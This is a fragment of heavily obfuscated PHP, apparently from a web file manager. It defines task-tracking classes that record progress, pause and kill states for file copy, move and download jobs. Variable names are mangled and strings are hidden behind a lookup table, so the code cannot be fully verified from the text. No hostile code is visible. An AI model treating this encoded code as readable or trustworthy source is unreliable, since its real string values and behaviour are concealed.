log($›ş‡‹·Ê) { write_log($›ş‡‹·Ê, $_SERVER[¡“ËÌ§œ][1645]); } private static function cacheClear() { $¾ô½ä½Î =& $_SERVER[¡“ËÌ§œ]; Cache::clearMemory(Model($¾ô½ä½Î[473])->cacheKey($¾ô½ä½Î[1658])); Cache::clearMemory(Model($¾ô½ä½Î[473])->cacheKey($¾ô½ä½Î[1660])); Model($¾ô½ä½Î[1630])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\157\x70"; const STATYS_RUNNING = "\x72\165\156\156\x69\x6e\147"; const STATYS_KILL = "\153\x69\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($»“öˆ´º, $×åÉ·¤ë = '', $µÒ™ºæ´ = 0, $ÓÙ¦Ôïì = '') { $ñ›¨èìÀ =& $_SERVER[¡“ËÌ§œ]; if (self::get($»“öˆ´º)) { return; } $this->task = array($ñ›¨èìÀ[437] => $»“öˆ´º, $ñ›¨èìÀ[1661] => USER_ID, $ñ›¨èìÀ[1559] => $ÓÙ¦Ôïì, $ñ›¨èìÀ[491] => $ñ›¨èìÀ[12], $ñ›¨èìÀ[33] => $×åÉ·¤ë, $ñ›¨èìÀ[1084] => $ñ›¨èìÀ[12], $ñ›¨èìÀ[806] => $µÒ™ºæ´, $ñ›¨èìÀ[1662] => 0, $ñ›¨èìÀ[1663] => 0, $ñ›¨èìÀ[1664] => 0, $ñ›¨èìÀ[1665] => timeFloat(), $ñ›¨èìÀ[1666] => 0, $ñ›¨èìÀ[1667] => 0, $ñ›¨èìÀ[1668] => 0, $ñ›¨èìÀ[1669] => 0, $ñ›¨èìÀ[770] => $ñ›¨èìÀ[1618]); $GLOBALS[$ñ›¨èìÀ[1670]] = 1; Hook::bind($ñ›¨èìÀ[1625], array($this, $ñ›¨èìÀ[1671])); Hook::bind($ñ›¨èìÀ[1672], array($this, $ñ›¨èìÀ[1673])); $this->startAfter(); Hook::trigger($ñ›¨èìÀ[1674], $this->task); $this->task[$ñ›¨èìÀ[1667]] = timeFloat(); } public function end($öœœ”À = '') { $†Ã Û™£ =& $_SERVER[¡“ËÌ§œ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$†Ã Û™£[1667]]) { self::valueSet($this->task[$†Ã Û™£[437]], !1); } $this->isEnd = !0; if ($öœœ”À) { $this->task[$†Ã Û™£[491]] = $öœœ”À; } self::log($†Ã Û™£[1675] . $this->task[$†Ã Û™£[437]] . $†Ã Û™£[1676] . sprintf($†Ã Û™£[870], timeFloat() - $this->task[$†Ã Û™£[1665]]) . $†Ã Û™£[1677]); Hook::unbind($†Ã Û™£[1625], array($this, $†Ã Û™£[1671])); Hook::unbind($†Ã Û™£[1672], array($this, $†Ã Û™£[1673])); $this->endAfter(); $ûİä¨ş = $this->task; $this->task = !1; Hook::trigger($†Ã Û™£[1678], $ûİä¨ş); } public function update($¸©’Û¿¢ = 0, $Ìí¦œ—î = false) { $¤¾ˆ…µó =& $_SERVER[¡“ËÌ§œ]; $İÁÑºÚÔ =& $this->task; if (!$İÁÑºÚÔ) { return; } $İÁÑºÚÔ[$¤¾ˆ…µó[1662]] += $¸©’Û¿¢; $İÁÑºÚÔ[$¤¾ˆ…µó[1666]] = timeFloat(); if ($İÁÑºÚÔ[$¤¾ˆ…µó[806]]) { if ($İÁÑºÚÔ[$¤¾ˆ…µó[806]] < $İÁÑºÚÔ[$¤¾ˆ…µó[1662]]) { $İÁÑºÚÔ[$¤¾ˆ…µó[806]] = $İÁÑºÚÔ[$¤¾ˆ…µó[1662]]; } $òÈ‘Şƒù = timeFloat() - $İÁÑºÚÔ[$¤¾ˆ…µó[1665]] - $İÁÑºÚÔ[$¤¾ˆ…µó[1668]]; if ($òÈ‘Şƒù <= 0) { $òÈ‘Şƒù = 0.001; } $İÁÑºÚÔ[$¤¾ˆ…µó[1663]] = $İÁÑºÚÔ[$¤¾ˆ…µó[1662]] / $İÁÑºÚÔ[$¤¾ˆ…µó[806]]; $İÁÑºÚÔ[$¤¾ˆ…µó[1664]] = $İÁÑºÚÔ[$¤¾ˆ…µó[1662]] / $òÈ‘Şƒù; if ($İÁÑºÚÔ[$¤¾ˆ…µó[1663]] > 0) { $İÁÑºÚÔ[$¤¾ˆ…µó[1669]] = $òÈ‘Şƒù * (1 - $İÁÑºÚÔ[$¤¾ˆ…µó[1663]]) / $İÁÑºÚÔ[$¤¾ˆ…µó[1663]]; } $İÁÑºÚÔ[$¤¾ˆ…µó[1669]] = $İÁÑºÚÔ[$¤¾ˆ…µó[1669]] <= 0 ? 0 : $İÁÑºÚÔ[$¤¾ˆ…µó[1669]]; } $this->updateAfter(); $¤Òé³÷ = 0.2; if (timeFloat() - $İÁÑºÚÔ[$¤¾ˆ…µó[1667]] < $¤Òé³÷ && !$Ìí¦œ—î) { return; } $°É½•û› = self::get($İÁÑºÚÔ[$¤¾ˆ…µó[437]]); $¯¬çì²È = $°É½•û›[$¤¾ˆ…µó[770]]; if ($¯¬çì²È == self::STATYS_KILL) { $Ëş€âÍ = array($¤¾ˆ…µó[1679] => LNG($¤¾ˆ…µó[1680]), $¤¾ˆ…µó[1232] => !1); Cache::set($¤¾ˆ…µó[1681] . $this->task[$¤¾ˆ…µó[437]], $Ëş€âÍ, 30); $this->onKill(); $this->end(); die; } else { if ($¯¬çì²È == self::STATYS_STOP) { $—öÌèšÍ = 2; $°É½•û›[$¤¾ˆ…µó[1668]] += $—öÌèšÍ; self::valueSet($İÁÑºÚÔ[$¤¾ˆ…µó[437]], $°É½•û›); sleep($—öÌèšÍ); $this->update(); return; } } $İÁÑºÚÔ[$¤¾ˆ…µó[770]] = $¯¬çì²È ? $¯¬çì²È : $İÁÑºÚÔ[$¤¾ˆ…µó[770]]; $İÁÑºÚÔ[$¤¾ˆ…µó[1668]] = $°É½•û›[$¤¾ˆ…µó[1668]] ? $°É½•û›[$¤¾ˆ…µó[1668]] : 0; $İÁÑºÚÔ[$¤¾ˆ…µó[1667]] = timeFloat(); Hook::trigger($¤¾ˆ…µó[1682], $İÁÑºÚÔ); self::valueSet($İÁÑºÚÔ[$¤¾ˆ…µó[437]], $İÁÑºÚÔ); } public function onKillSet($êœŞŒ¡«, $·¬ïœ» = array()) { $this->onKillCall = array($êœŞŒ¡«, $·¬ïœ»); } public function onKill() { $§ı¢°€¶ =& $_SERVER[¡“ËÌ§œ]; self::log($§ı¢°€¶[1675] . $this->task[$§ı¢°€¶[437]] . $§ı¢°€¶[1683]); Hook::trigger($§ı¢°€¶[1684], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ÉÆ³³¾–) { $€Ìã€½£ =& $_SERVER[¡“ËÌ§œ]; Cache::set($€Ìã€½£[1681] . $this->task[$€Ìã€½£[437]], $ÉÆ³³¾–, 60); return $ÉÆ³³¾–; } public static function get($ìäšÓ) { $ËŞåØå =& $_SERVER[¡“ËÌ§œ]; $†‹³à¥¿ = self::valueGet($ìäšÓ); if (is_array($†‹³à¥¿) && $†‹³à¥¿[$ËŞåØå[1685]]) { $Œ”úÚ³¶ = ActionApply($†‹³à¥¿[$ËŞåØå[1685]], array($†‹³à¥¿)); $†‹³à¥¿ = is_array($Œ”úÚ³¶) ? $Œ”úÚ³¶ : $†‹³à¥¿; } return $†‹³à¥¿; } public static function listData() { $Çœ¦°ÄÓ = self::valueGet(); return array_sort_by($Çœ¦°ÄÓ, $_SERVER[¡“ËÌ§œ][1665], !0); } public static function kill($ÃüÌøº…) { return self::changeStatus($ÃüÌøº…, self::STATYS_KILL); } public static function stop($°‡øÅµ¸) { return self::changeStatus($°‡øÅµ¸, self::STATYS_STOP); } public static function restart($êÆê¨ò´) { return self::changeStatus($êÆê¨ò´, self::STATYS_RUNNING); } public static function killAll() { $Ùé¤êóÙ =& $_SERVER[¡“ËÌ§œ]; $âàªáå¥ = self::listData(); foreach ($âàªáå¥ as $ÂĞ´æÑÂ) { self::kill($ÂĞ´æÑÂ[$Ùé¤êóÙ[437]]); } sleep(2); foreach ($âàªáå¥ as $ÂĞ´æÑÂ) { self::valueSet($ÂĞ´æÑÂ[$Ùé¤êóÙ[437]], !1); } } private static function changeStatus($ãúÙÖÈÜ, $‚‡½ƒÜå) { $‚ÆÆ´ó =& $_SERVER[¡“ËÌ§œ]; $ç·™…Û¿ = self::valueGet($ãúÙÖÈÜ); if (!$ç·™…Û¿) { return !1; } $ç·™…Û¿[$‚ÆÆ´ó[770]] = $‚‡½ƒÜå; self::valueSet($ãúÙÖÈÜ, $ç·™…Û¿); self::log($‚ÆÆ´ó[1686] . $ç·™…Û¿[$‚ÆÆ´ó[437]] . $‚ÆÆ´ó[1687] . $‚‡½ƒÜå); return !0; } public static function valueGet($áœ«¡†Ó = false) { $ÜƒÉ€ê’ =& $_SERVER[¡“ËÌ§œ]; if ($áœ«¡†Ó) { $úÚÌ¸è÷ = Model($ÜƒÉ€ê’[485])->where(array($ÜƒÉ€ê’[94] => $áœ«¡†Ó, $ÜƒÉ€ê’[33] => $ÜƒÉ€ê’[1091]))->find(); return $úÚÌ¸è÷ ? json_decode($úÚÌ¸è÷[$ÜƒÉ€ê’[403]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Ì¯í–ñµ = false) { $ÖĞõ‘Š =& $_SERVER[¡“ËÌ§œ]; $ıò’‹¿ = array($ÖĞõ‘Š[33] => $ÖĞõ‘Š[1091]); if ($Ì¯í–ñµ) { $ıò’‹¿[$ÖĞõ‘Š[1661]] = $Ì¯í–ñµ; } $»šı‡ıÄ = Model($ÖĞõ‘Š[485])->where($ıò’‹¿)->select(); $»šı‡ıÄ = $»šı‡ıÄ ? $»šı‡ıÄ : array(); foreach ($»šı‡ıÄ as $¡ØÇææ => $»»ıòş) { $»šı‡ıÄ[$¡ØÇææ] = json_decode($»»ıòş[$ÖĞõ‘Š[403]], !0); } return $»šı‡ıÄ; } public static function valueSet($‡ÊŠŒÕ·, $È–ä®¤¥) { $·Šì¥¿ò =& $_SERVER[¡“ËÌ§œ]; if (!$È–ä®¤¥) { return Model($·Šì¥¿ò[485])->where(array($·Šì¥¿ò[94] => $‡ÊŠŒÕ·, $·Šì¥¿ò[33] => $·Šì¥¿ò[1091]))->delete(); } $Ğ—¨ÆİÈ = json_encode($È–ä®¤¥); if (!$Ğ—¨ÆİÈ) { ob_start(); var_dump($È–ä®¤¥); $Â¾Ğó•À = ob_get_clean(); self::log($·Šì¥¿ò[1688] . json_encode_force($Â¾Ğó•À)); } if (!$‡ÊŠŒÕ· || !$È–ä®¤¥[$·Šì¥¿ò[437]]) { return !1; } $°®™Ì¹Û = array($·Šì¥¿ò[33] => $·Šì¥¿ò[1091], $·Šì¥¿ò[1661] => USER_ID, $·Šì¥¿ò[94] => $‡ÊŠŒÕ·, $·Šì¥¿ò[403] => $Ğ—¨ÆİÈ); $Çú¡¬€ˆ = $·Šì¥¿ò[1689]; CacheLock::lock($Çú¡¬€ˆ); Model($·Šì¥¿ò[485])->add($°®™Ì¹Û, array(), !0); CacheLock::unlock($Çú¡¬€ˆ); } public static function log($µ© ùÑ¯) { if (!GLOBAL_DEBUG) { return; } write_log($µ© ùÑ¯, $_SERVER[¡“ËÌ§œ][1690]); } } class TaskFileTransfer extends Task { protected function startAfter() { $Ç¶†Ò¯€ =& $_SERVER[¡“ËÌ§œ]; $•¹²ÌÄ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($Ç¶†Ò¯€[1691], array($this, $Ç¶†Ò¯€[1692])); Hook::bind($Ç¶†Ò¯€[1243], array($this, $Ç¶†Ò¯€[1693])); Hook::bind($Ç¶†Ò¯€[1694], array($this, $Ç¶†Ò¯€[1695])); Hook::bind($Ç¶†Ò¯€[634], array($this, $Ç¶†Ò¯€[1696])); Hook::bind($Ç¶†Ò¯€[635], array($this, $Ç¶†Ò¯€[1697])); Hook::bind($Ç¶†Ò¯€[640], array($this, $Ç¶†Ò¯€[1698])); Hook::bind($Ç¶†Ò¯€[641], array($this, $Ç¶†Ò¯€[1699])); Hook::bind($Ç¶†Ò¯€[637], array($this, $Ç¶†Ò¯€[1700])); Hook::bind($Ç¶†Ò¯€[638], array($this, $Ç¶†Ò¯€[1701])); Hook::bind($Ç¶†Ò¯€[603], array($this, $Ç¶†Ò¯€[1702])); Hook::bind($Ç¶†Ò¯€[600], array($this, $Ç¶†Ò¯€[1702])); Hook::bind($Ç¶†Ò¯€[605], array($this, $Ç¶†Ò¯€[1702])); Hook::bind($Ç¶†Ò¯€[607], array($this, $Ç¶†Ò¯€[1702])); Hook::bind($Ç¶†Ò¯€[609], array($this, $Ç¶†Ò¯€[1702])); Hook::bind($Ç¶†Ò¯€[1703], array($this, $Ç¶†Ò¯€[1704])); Hook::bind($Ç¶†Ò¯€[625], array($this, $Ç¶†Ò¯€[1705])); $this->sourceModelCopyFlag = !1; Hook::bind($Ç¶†Ò¯€[1706], array($this, $Ç¶†Ò¯€[1707])); Hook::bind($Ç¶†Ò¯€[1708], array($this, $Ç¶†Ò¯€[1709])); Hook::bind($Ç¶†Ò¯€[1710], array($this, $Ç¶†Ò¯€[1711])); $•¹²ÌÄ[$Ç¶†Ò¯€[1712]] = LNG($Ç¶†Ò¯€[1713]); $•¹²ÌÄ[$Ç¶†Ò¯€[1714]] = 0; $•¹²ÌÄ[$Ç¶†Ò¯€[1715]] = 0; $•¹²ÌÄ[$Ç¶†Ò¯€[1084]] = $Ç¶†Ò¯€[12]; $•¹²ÌÄ[$Ç¶†Ò¯€[1716]] = $Ç¶†Ò¯€[12]; $•¹²ÌÄ[$Ç¶†Ò¯€[1717]] = 0; $•¹²ÌÄ[$Ç¶†Ò¯€[1718]] = 0; $•¹²ÌÄ[$Ç¶†Ò¯€[1719]] = 0; if (!$•¹²ÌÄ[$Ç¶†Ò¯€[1559]]) { $•¹²ÌÄ[$Ç¶†Ò¯€[1559]] = LNG($Ç¶†Ò¯€[1720]); } } protected function endAfter() { $œ¿“€ƒß =& $_SERVER[¡“ËÌ§œ]; Hook::unbind($œ¿“€ƒß[1691], array($this, $œ¿“€ƒß[1692])); Hook::unbind($œ¿“€ƒß[1243], array($this, $œ¿“€ƒß[1693])); Hook::unbind($œ¿“€ƒß[1694], array($this, $œ¿“€ƒß[1695])); Hook::unbind($œ¿“€ƒß[634], array($this, $œ¿“€ƒß[1696])); Hook::unbind($œ¿“€ƒß[635], array($this, $œ¿“€ƒß[1697])); Hook::unbind($œ¿“€ƒß[640], array($this, $œ¿“€ƒß[1698])); Hook::unbind($œ¿“€ƒß[641], array($this, $œ¿“€ƒß[1699])); Hook::unbind($œ¿“€ƒß[637], array($this, $œ¿“€ƒß[1700])); Hook::unbind($œ¿“€ƒß[638], array($this, $œ¿“€ƒß[1701])); Hook::unbind($œ¿“€ƒß[603], array($this, $œ¿“€ƒß[1702])); Hook::unbind($œ¿“€ƒß[600], array($this, $œ¿“€ƒß[1702])); Hook::unbind($œ¿“€ƒß[605], array($this, $œ¿“€ƒß[1702])); Hook::unbind($œ¿“€ƒß[607], array($this, $œ¿“€ƒß[1702])); Hook::unbind($œ¿“€ƒß[609], array($this, $œ¿“€ƒß[1702])); Hook::unbind($œ¿“€ƒß[1703], array($this, $œ¿“€ƒß[1704])); Hook::unbind($œ¿“€ƒß[625], array($this, $œ¿“€ƒß[1705])); Hook::unbind($œ¿“€ƒß[1706], array($this, $œ¿“€ƒß[1707])); Hook::unbind($œ¿“€ƒß[1708], array($this, $œ¿“€ƒß[1709])); Hook::unbind($œ¿“€ƒß[1710], array($this, $œ¿“€ƒß[1711])); } public function copyMoveStart($š­º ©¥, $úıŒ»÷â, $à™“òéî, $Œ¼¶ÃÊ) { $Ğû¯çŒ÷ =& $_SERVER[¡“ËÌ§œ]; self::log($Ğû¯çŒ÷[1721] . $úıŒ»÷â . $Ğû¯çŒ÷[70] . $Œ¼¶ÃÊ); $ÅùşãÎò = rtrim(TEMP_FILES, $Ğû¯çŒ÷[8]); if (substr($úıŒ»÷â, 0, strlen($ÅùşãÎò)) == $ÅùşãÎò) { return; } if (substr($Œ¼¶ÃÊ, 0, strlen($ÅùşãÎò)) == $ÅùşãÎò) { return; } $ç©°§›· =& $this->task; $ç©°§›·[$Ğû¯çŒ÷[1722]] = KodIO::transferType($š­º ©¥, $à™“òéî); $this->update(); } public function updateAfter() { $ÃÈßõ¸ =& $_SERVER[¡“ËÌ§œ]; $ÉËÍ©Ø =& $this->task; if (!$ÉËÍ©Ø[$ÃÈßõ¸[783]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ÉËÍ©Ø[$ÃÈßõ¸[1722]] == $ÃÈßõ¸[1335]) { return; } self::updateTask($ÉËÍ©Ø); } private static function updateTask(&$ôå–±—ğ) { $ÑˆÚˆÉÛ =& $_SERVER[¡“ËÌ§œ]; if ($ôå–±—ğ[$ÑˆÚˆÉÛ[1722]] == $ÑˆÚˆÉÛ[1214] || $ôå–±—ğ[$ÑˆÚˆÉÛ[1722]] == $ÑˆÚˆÉÛ[107]) { if ($ôå–±—ğ[$ÑˆÚˆÉÛ[1716]]) { $ôå–±—ğ[$ÑˆÚˆÉÛ[1719]] = $ôå–±—ğ[$ÑˆÚˆÉÛ[1718]] + $ôå–±—ğ[$ÑˆÚˆÉÛ[1715]]; } } else { if ($ôå–±—ğ[$ÑˆÚˆÉÛ[1722]] == $ÑˆÚˆÉÛ[1336]) { if ($ôå–±—ğ[$ÑˆÚˆÉÛ[1716]] == $ÑˆÚˆÉÛ[1214]) { $ôå–±—ğ[$ÑˆÚˆÉÛ[1719]] = $ôå–±—ğ[$ÑˆÚˆÉÛ[1718]] + $ôå–±—ğ[$ÑˆÚˆÉÛ[1715]] * 0.5; } else { if ($ôå–±—ğ[$ÑˆÚˆÉÛ[1716]] == $ÑˆÚˆÉÛ[107]) { $ôå–±—ğ[$ÑˆÚˆÉÛ[1719]] = $ôå–±—ğ[$ÑˆÚˆÉÛ[1718]] + $ôå–±—ğ[$ÑˆÚˆÉÛ[1714]] * 0.5 + $ôå–±—ğ[$ÑˆÚˆÉÛ[1715]] * 0.5; } } } } $ôå–±—ğ[$ÑˆÚˆÉÛ[1663]] = $ôå–±—ğ[$ÑˆÚˆÉÛ[1719]] / $ôå–±—ğ[$ÑˆÚˆÉÛ[783]]; if ($ôå–±—ğ[$ÑˆÚˆÉÛ[1663]] > 0) { $ˆ±ŒÖúİ = timeFloat() - $ôå–±—ğ[$ÑˆÚˆÉÛ[1665]] - $ôå–±—ğ[$ÑˆÚˆÉÛ[1668]]; $ôå–±—ğ[$ÑˆÚˆÉÛ[1669]] = $ˆ±ŒÖúİ * (1 - $ôå–±—ğ[$ÑˆÚˆÉÛ[1663]]) / $ôå–±—ğ[$ÑˆÚˆÉÛ[1663]]; } } public function addPath($š€ùÓú) { $ÊÀœ¾©é =& $_SERVER[¡“ËÌ§œ]; if (!$š€ùÓú) { return; } $ùÑ‚Ì¨ =& $this->task; $‡¤Ïï‹Õ = IO::infoWithChildren($š€ùÓú); $Ë¾üÏüÍ = $ùÑ‚Ì¨[$ÊÀœ¾©é[1723]] ? $ùÑ‚Ì¨[$ÊÀœ¾©é[1723]][$ÊÀœ¾©é[1724]] : 0; $ùÑ‚Ì¨[$ÊÀœ¾©é[1723]] = array($ÊÀœ¾©é[1724] => $Ë¾üÏüÍ + 1, $ÊÀœ¾©é[458] => $‡¤Ïï‹Õ[$ÊÀœ¾©é[32]], $ÊÀœ¾©é[84] => $‡¤Ïï‹Õ[$ÊÀœ¾©é[84]], $ÊÀœ¾©é[547] => $‡¤Ïï‹Õ[$ÊÀœ¾©é[547]] ? $‡¤Ïï‹Õ[$ÊÀœ¾©é[547]] : $‡¤Ïï‹Õ[$ÊÀœ¾©é[84]]); if ($‡¤Ïï‹Õ[$ÊÀœ¾©é[33]] == $ÊÀœ¾©é[200]) { $ùÑ‚Ì¨[$ÊÀœ¾©é[806]] += 1; } else { $ùÑ‚Ì¨[$ÊÀœ¾©é[806]] += $‡¤Ïï‹Õ[$ÊÀœ¾©é[79]][$ÊÀœ¾©é[77]]; if ($‡¤Ïï‹Õ[$ÊÀœ¾©é[440]]) { $ùÑ‚Ì¨[$ÊÀœ¾©é[806]] += $‡¤Ïï‹Õ[$ÊÀœ¾©é[79]][$ÊÀœ¾©é[78]] + 1; } } $ùÑ‚Ì¨[$ÊÀœ¾©é[783]] += $‡¤Ïï‹Õ[$ÊÀœ¾©é[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($Š¿éÜæÉ) { } public function sourceAddHashEnd($¸èæ¥¬) { } public function sourceAddFileStart($áùÈ·ÍÌ) { $´¯¿óåá =& $_SERVER[¡“ËÌ§œ]; $¿ãëõÒä =& $this->task; $¿ãëõÒä[$´¯¿óåá[1714]] = $áùÈ·ÍÌ[$´¯¿óåá[76]]; $¿ãëõÒä[$´¯¿óåá[1712]] = $áùÈ·ÍÌ[$´¯¿óåá[32]]; $¿ãëõÒä[$´¯¿óåá[1084]] = $áùÈ·ÍÌ[$´¯¿óåá[32]]; $¿ãëõÒä[$´¯¿óåá[1725]] = $áùÈ·ÍÌ[$´¯¿óåá[84]]; $this->update(); } public function sourceAddFileEnd($Š¼ãŒø) { $ÓÔïè‘µ =& $_SERVER[¡“ËÌ§œ]; $”˜´†ª =& $this->task; $”˜´†ª[$ÓÔïè‘µ[1719]] += $Š¼ãŒø[$ÓÔïè‘µ[76]]; $”˜´†ª[$ÓÔïè‘µ[1725]] = $Š¼ãŒø[$ÓÔïè‘µ[84]]; $this->update(1); } public function copyFileStart($ùØƒŠ‡§, $á²î½óµ, $à×ÍœôÒ, $¨õÖ¥“í, $¯™Ê‰í‘, $è†“öÊ) { $¹Ì®ËÛ€ =& $_SERVER[¡“ËÌ§œ]; $šÊœõªÉ = $¯™Ê‰í‘; if ($šÊœõªÉ == $GLOBALS[$¹Ì®ËÛ€[1726]]) { $šÊœõªÉ = $GLOBALS[$¹Ì®ËÛ€[1727]]; } $GLOBALS[$¹Ì®ËÛ€[1727]] = $¯™Ê‰í‘; $GLOBALS[$¹Ì®ËÛ€[1726]] = $è†“öÊ; $„ªÃòÙ =& $this->task; $„ªÃòÙ[$¹Ì®ËÛ€[1712]] = $šÊœõªÉ; $„ªÃòÙ[$¹Ì®ËÛ€[1714]] = (int) $ùØƒŠ‡§->size($á²î½óµ); $„ªÃòÙ[$¹Ì®ËÛ€[1715]] = 0; $„ªÃòÙ[$¹Ì®ËÛ€[1084]] = $¹Ì®ËÛ€[12]; $„ªÃòÙ[$¹Ì®ËÛ€[1716]] = $¹Ì®ËÛ€[12]; $„ªÃòÙ[$¹Ì®ËÛ€[1717]] = 0; $ŒÁŠ¦ôø = $„ªÃòÙ[$¹Ì®ËÛ€[1714]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($„ªÃòÙ[$¹Ì®ËÛ€[437]] . $¹Ì®ËÛ€[1728]); if ($ŒÁŠ¦ôø && file_exists(get_path_father($¨õÖ¥“í))) { Cache::set($„ªÃòÙ[$¹Ì®ËÛ€[437]] . $¹Ì®ËÛ€[1728], $¨õÖ¥“í); $„ªÃòÙ[$¹Ì®ËÛ€[1685]] = array($¹Ì®ËÛ€[1729], $¹Ì®ËÛ€[1730]); } $this->update(0, $ŒÁŠ¦ôø); } public static function updateCopyLocalFileSize($†„§ìò³) { $Ş¥Šì­‚ =& $_SERVER[¡“ËÌ§œ]; $¤ß©†‚ = Cache::get($†„§ìò³[$Ş¥Šì­‚[437]] . $Ş¥Šì­‚[1728]); if (!$¤ß©†‚ || !file_exists($¤ß©†‚)) { return $†„§ìò³; } $†„§ìò³[$Ş¥Šì­‚[1715]] = @filesize($¤ß©†‚); $†„§ìò³[$Ş¥Šì­‚[1719]] += $†„§ìò³[$Ş¥Šì­‚[1715]]; self::updateTask($†„§ìò³); return $†„§ìò³; } public function copyFileEnd($†şáº³†, $¾¨‡ÇçÎ, $Œø»êÃğ, $•´šâ, $ñğŞé…, $½¢àøÄˆ) { $çë†ö¥ =& $_SERVER[¡“ËÌ§œ]; $®Å§úñ =& $this->task; $®Å§úñ[$çë†ö¥[1715]] = $®Å§úñ[$çë†ö¥[1714]]; $®Å§úñ[$çë†ö¥[1716]] = $çë†ö¥[12]; unset($®Å§úñ[$çë†ö¥[1685]]); if ($ñğŞé… == $®Å§úñ[$çë†ö¥[1712]]) { $®Å§úñ[$çë†ö¥[1718]] += $®Å§úñ[$çë†ö¥[1714]]; $®Å§úñ[$çë†ö¥[1719]] = $®Å§úñ[$çë†ö¥[1718]]; $¶Ù§‰‹— = 1; if (isset($®Å§úñ[$çë†ö¥[1725]]) && $®Å§úñ[$çë†ö¥[1725]] == $¾¨‡ÇçÎ) { $¶Ù§‰‹— = 0; } $this->update($¶Ù§‰‹—); } else { $this->update(); $®Å§úñ[$çë†ö¥[1715]] = 0; } Cache::remove($®Å§úñ[$çë†ö¥[437]] . $çë†ö¥[1728]); self::log($çë†ö¥[1731] . $¾¨‡ÇçÎ . $çë†ö¥[70] . $•´šâ . $çë†ö¥[231] . $ñğŞé… . $çë†ö¥[1732] . $®Å§úñ[$çë†ö¥[1712]]); } public function updateFileEnd($á»¡üİê, $µåË›Ê) { $âñİáÇÍ =& $_SERVER[¡“ËÌ§œ]; $¨šàµã =& $this->task; $¨šàµã[$âñİáÇÍ[1712]] = $á»¡üİê; $¨šàµã[$âñİáÇÍ[1714]] = $µåË›Ê; $¨šàµã[$âñİáÇÍ[1718]] += $µåË›Ê; $¨šàµã[$âñİáÇÍ[1719]] = $¨šàµã[$âñİáÇÍ[1718]]; $this->update(1); self::log($âñİáÇÍ[1733] . $á»¡üİê); } public function sourceModelCopy($‘•¥¾ˆ) { $õ¼¬¡‹Û =& $_SERVER[¡“ËÌ§œ]; $×…È¡øÜ = $‘•¥¾ˆ[0]; $ÄƒşÜ§ç = $‘•¥¾ˆ[1]; $†Ò…×è² =& $this->task; $this->sourceModelCopyFlag = !0; $‡áĞœş´ = 0; switch ($×…È¡øÜ) { case $õ¼¬¡‹Û[601]: $‡áĞœş´ = 1; break; case $õ¼¬¡‹Û[604]: $†Ò…×è²[$õ¼¬¡‹Û[1712]] = $ÄƒşÜ§ç[$õ¼¬¡‹Û[32]]; break; case $õ¼¬¡‹Û[606]: $‡áĞœş´ = intval($‘•¥¾ˆ[$õ¼¬¡‹Û[409]] * 0.4); break; case $õ¼¬¡‹Û[608]: $‡áĞœş´ = intval($‘•¥¾ˆ[$õ¼¬¡‹Û[409]] * 0.2); break; case $õ¼¬¡‹Û[610]: $‡áĞœş´ = intval($‘•¥¾ˆ[$õ¼¬¡‹Û[409]] * 0.4); break; } $this->update($‡áĞœş´); $this->sourceModelCopyFlag = !1; } public function sourceRemove($šà±ß³Û, $»‘‚§…í) { $àÈ½›î =& $_SERVER[¡“ËÌ§œ]; $this->sourceModelCopyFlag = !0; $ƒÎ°¨Ûï = 1; if (isset($šà±ß³Û[$àÈ½›î[79]])) { $ƒÎ°¨Ûï = $šà±ß³Û[$àÈ½›î[79]][$àÈ½›î[77]]; $ƒÎ°¨Ûï = $ƒÎ°¨Ûï + $šà±ß³Û[$àÈ½›î[79]][$àÈ½›î[78]] + 1; } $this->update($ƒÎ°¨Ûï); $this->sourceModelCopyFlag = !1; } public function sourceMove($ŞÈÜµî…) { $this->sourceRemove($ŞÈÜµî…, !1); } public function curlProgress($éå£È‹¿, $Õ¤ÛºÅ˜, $ğ½¨šî, $ıÕ·Í˜‹, $—Ô“•Äø) { $ïªË–š© =& $_SERVER[¡“ËÌ§œ]; $ŒƒÆ‘­÷ =& $this->task; if ($—Ô“•Äø > 0) { $ŒƒÆ‘­÷[$ïªË–š©[1084]] = $ïªË–š©[1734]; $ŒƒÆ‘­÷[$ïªË–š©[1716]] = $ïªË–š©[107]; if ($ŒƒÆ‘­÷[$ïªË–š©[1714]]) { $ŒƒÆ‘­÷[$ïªË–š©[1715]] = $—Ô“•Äø; } if ($ŒƒÆ‘­÷[$ïªË–š©[1717]]) { $ŒƒÆ‘­÷[$ïªË–š©[1715]] = $—Ô“•Äø + $ŒƒÆ‘­÷[$ïªË–š©[1717]]; } } else { if ($ğ½¨šî > 0) { if ($ŒƒÆ‘­÷[$ïªË–š©[1714]] == $Õ¤ÛºÅ˜) { $ŒƒÆ‘­÷[$ïªË–š©[1715]] = $ğ½¨šî; $ŒƒÆ‘­÷[$ïªË–š©[1084]] = $ïªË–š©[1735]; $ŒƒÆ‘­÷[$ïªË–š©[1716]] = $ïªË–š©[1214]; } } } $this->update(); } public function curlProgressStart($œ“Í·í£) { } public function curlProgressEnd($ıÆÂ–ùÃ) { $Å¹Œ¾« =& $_SERVER[¡“ËÌ§œ]; $ª˜øÀ½Ù =& $this->task; $¦¥ò„Ì = curl_getinfo($ıÆÂ–ùÃ); $Ôù”Š¤Š = $¦¥ò„Ì[$Å¹Œ¾«[1736]]; if ($Ôù”Š¤Š == -1) { $Ôù”Š¤Š = $¦¥ò„Ì[$Å¹Œ¾«[1737]]; } if ($ª˜øÀ½Ù[$Å¹Œ¾«[1716]] == $Å¹Œ¾«[107] && $Ôù”Š¤Š) { $ª˜øÀ½Ù[$Å¹Œ¾«[1717]] += $Ôù”Š¤Š; } $this->update(); } } goto Eò´‡¸¹‰¦; dœÏÃë¼ì¡: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\56\x4c\x69\147\x68\164\101\160\160"; public $modelType = 